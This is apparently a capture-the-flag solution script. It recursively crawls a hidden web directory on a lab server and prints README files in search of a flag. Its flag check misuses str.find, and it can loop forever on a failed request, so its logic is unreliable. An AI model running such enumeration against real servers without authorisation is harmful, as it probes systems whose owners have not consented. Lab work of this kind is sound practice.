import requests
import os

# Set the initial URL
url = "http://192.168.64.36/.hidden/"

# Create a list to store the README file paths
readme_paths = []
all_folder = []

# Loop through the folder paths until all READMEs are downloaded
while True:
    # Send a GET request to the current URL
    response = requests.get(url)

    # Check if the response is successful
    if response.status_code == 200:
        # Find all the folder paths in the HTML
        # {url}/{path[:1]}
        folder_paths = [url + path.split('"')[0] for path in response.text.split('<a href="')[1:]]
        all_folder.extend(folder_paths)
        # print(all_folder)
        # break

        # Find the README file path
        readme_path = next((path for path in folder_paths if path.endswith('/README')), None)
        bad_path = next((path for path in folder_paths if path.endswith('../')), None)

        # If a README file path is found, add it to the list
        if bad_path:
            all_folder.remove(bad_path)
        if readme_path:
            readme_paths.append(readme_path)
            if requests.get(readme_path).text.find('flag'):
                print("Your flag is there:" + readme_path)
                print("Flag: " + requests.get(readme_path).text)
            all_folder.remove(readme_path)

        # If no more folder paths are found, break out of the loop
        if not all_folder:
            break

        # Move to the next folder path
        url = all_folder.pop()
        # print(url)